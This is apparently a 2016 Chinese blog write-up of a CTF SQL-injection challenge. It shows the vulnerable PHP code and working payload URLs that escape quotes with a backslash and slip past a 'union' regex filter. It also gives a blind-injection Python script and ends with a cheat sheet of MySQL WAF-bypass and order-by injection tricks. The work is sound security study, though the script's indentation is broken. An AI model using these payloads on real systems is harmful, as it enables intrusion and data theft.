---
title: 三个白帽子之我是李雷雷，我在寻找韩梅梅系列 1--writeup
url: 476.html
id: 476
categories:
  - hack_ctf
date: 2016-06-30 12:24:06
tags:
  - wirte-up
  - ctf
  
---

这是一个mysql的注入绕过类题目,相对来说是很简单的题目了,由于近来在学习基于正则的waf的绕过技巧,此处就拿此题作引子,引出下面的各种姿势吧.

<!--more-->

<h2><strong>0x1.先看题目:</strong></h2>

[php]
<?php

/*

create table baimaozi (intro varchar(40),name varchar(20),nick varchar(20));
insert into baimaozi values (md5('flag'),'wonderkun','wonderkun');
create table `flag` (`flag` varchar(32));
insert into flag values (md5('flag'));

*/

function sanitize($input){
$blacklist = array('\'', '"', '/', '*', '.');
return str_replace($blacklist, '', $input);
}
$host = "localhost";
$user = "root";
$pass = "123456";
$db = "sangebaimao";

$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");
mysql_select_db($db) or die("Unable to select database");

$name = isset($_GET['name'])?sanitize($_GET['name']):die();

$query = 'select intro from baimaozi where name=\''.$name.'\' or nick=\''.$name.'\' limit 1';

echo $query;
if (preg_match('/[^a-zA-Z0-9_]union[^a-zA-Z0-9_]/i', $name) || preg_match('/^union[^a-zA-Z0-9_]/i', $name)){
echo "not allow";
exit;
}

$result = mysql_query($query);

$row = mysql_fetch_array($result);
echo $row[0];

[/php]

看了一下第一处过滤:

[php]
function sanitize($input){
 $blacklist = array('\'', '"', '/', '*', '.');
 return str_replace($blacklist, '', $input);
}
[/php]

可以看到过滤了,单引号,双引号,/,*,还有点;
再看下面构造的sql语句:

[php]
$query = 'select intro from baimaozi where name=\''.$name.'\' or nick=\''.$name.'\' limit 1';
[/php]

变量是用单引号包裹的,注入的时候却过滤了单引号,这就出现了一个问题,怎么在没有单引号的情况下闭合掉单引号???

思路是这样的,这个sql语句有4个单引号,其中两个两个配对,总共是两对,既然我们没有办法去输入单引号来闭合他原来的单引号,那么我们是不是可以通过干掉单引号来闭合单引号呢?

观察发现真的没有过滤 '\'(反斜杠),所以我们可以通过反斜杠去干掉单引号:先传入

[php] http://127.0.0.1/index.php?name=\[/php]

打印出来sql语句如下:

[php]select intro from baimaozi where name='\' or nick='\' limit 1[/php]

但是个sql语句报错了,因为第二个单引号被干掉了,第一个单引号和第三个单引号组成了一对,\' limit 1 就多余了..所以报错了.
所以考虑把\' limit 1 注释掉;

[php]http://127.0.0.1/index.php?name=%23\[/php]

sql语句如下:

[php]select intro from baimaozi where name='#\' or nick='#\' limit 1[/php]

<span style="color: #ff0000;">注意:第一个#包裹在单引号中间,没有起到注释的作用,第二个#才是注释.这下就不报错了.</span>

[php]

payload:http://127.0.0.1/index.php?name=%20or%20sleep(3)%23\  //成功延时

[/php]

<h2></h2>
<h2>0x2. 可以注入了,但是怎么出数据??</h2>
来看这个正则:

[php]

if (preg_match('/[^a-zA-Z0-9_]union[^a-zA-Z0-9_]/i', $name) || preg_match('/^union[^a-zA-Z0-9_]/i', $name)){
echo "not allow";
exit;
}

[/php]

如果^用于中括号表达式的第一个字符,表示对字符集取反,用于中括号外面表示以这个字符开头:

[^a-zA-Z0-9_]匹配除了这些字符之外的字符,^union 匹配由union开头的字符.
所以想绕过union仅有两种可能:
<ol>
 	<li>$name不是以union开头,但是其前或后至少要有一个字符在[a-zA-Z0-9_]的范围之内.</li>
 	<li>$name是用union开头,但是其后面的字符在[a-zA-Z0-9_]的范围之内</li>
</ol>
有两种解法:

<strong>解法一:绕过union的限制</strong>

某位大牛发现了下面方法:

<img class="alignnone size-full wp-image-483" src="/uploads/2016/06/深度截图20160630195653.png" alt="深度截图20160630195653" width="946" height="481" />

看到了吗 ?  由于过滤了'.',所以第一种payload不能用;

给两种payload:

[php]

payload1:http://127.0.0.1/index.php?name=or%20name=\Nunion%20select%20flag%20from%20flag%23\

payload2:http://127.0.0.1/index.php?name=or%20name=1E1union%20select%20flag%20from%20flag%23\

[/php]

<strong>解法二:bool盲注</strong>

由于比较简单,直接给python代码:

[python]
import requests 
perstr="0123456789abcdef"
flag=''
for i in range(1,33):
 for j in perstr:
 url="http://127.0.0.1/threebaimao/source1.php?name= or 1=if(ascii(substring((select flag from flag),{i},1))={j},1,0)%23\\".format(i=str(i),j=ord(j)) 
 
 res=requests.get(url)

 if "327a6c4304ad5938eaf0efb6cc3e53dc" in res.text :
 flag+=j
 break
 print flag
[/python]

<h2>0x3,mysql注入的其他绕过技巧(持续更新中....)</h2>

###  mysql常用的注释
```sql
 --+ , /**/ ,  # , -- -, ;%00 , `, 
```
### mysql 过滤了空格的绕过方法
```sql
1.可以用()绕过,但是有局限性,括号是用来包围子查询的,因此任何计算出来的结果都可以用括号包围起来
2.%09, %0a, %0b , %0c ,%0d , %a0  (%a0 不会被php的\s匹配,所以有时候有奇效), /**/ ,  
3.用多个空格代替一个空格
4.利用内敛注释:/*!select*//*!user*//*!from*//*!mysql.user*/;
```
### 过滤了 = 的绕过:
```sql
1.用函数绕过,: strcmp(),locate(s1,s) , position(s1 in s) , instr(s,s1),  greatest()
2.用 > , <  
3. like ,  regexp , in 
in 的用法 :select 'user' in ('user');    字符串都是可以用16进制代替的. 
```
###  等价替换的一些函数
```
hex() ,  bin()  => ascii()
sleep()      =>  benchmark() 
mid()  ,  substr()   =>  substring()
```
###  绕过逗号的情况  
```
select   substr(user()from(1)for(1)) ;
```
### 绕过某些关键字的过滤
```sql
select => sel%00ect   # 在ctf中出现好几次了,但是这不是通法,至少在我的mysql中是不行的.
select => /*!select*/  # may be  可以绕过啊
```
### order by 子句的注入:

```sql
1. select user,host from mysql.user  order by (case/**/when((1=2))then(user)else(host)end);

2. 报错注入 :  select user,host from mysql.user  order by (extractvalue(user(),concat(0x3a,user(),0x3a))); 

3. select user,host from mysql.user  order by if(1,user,host);  跟第一个差不多

4. select user,host from mysql.user  order by 1,(select case when (1=1) then 1 else 1*(select user from mysql.user) end )=1;
select user,host from mysql.user  order by 1,(select case when (1=2) then 1 else 1*(select user from mysql.user) end )=1;  
```

### mysql 的一个黑魔法
```sql
select {x user} from {x mysql.user};
select user from mysql.user where user=~18446744073709551615;
select  id from ctf.user where id=(sleep(ascii(mid(user()from(2)for(1)))=109)); (没有用到空格,逗号,大于或者小于号,非常实用!)
```

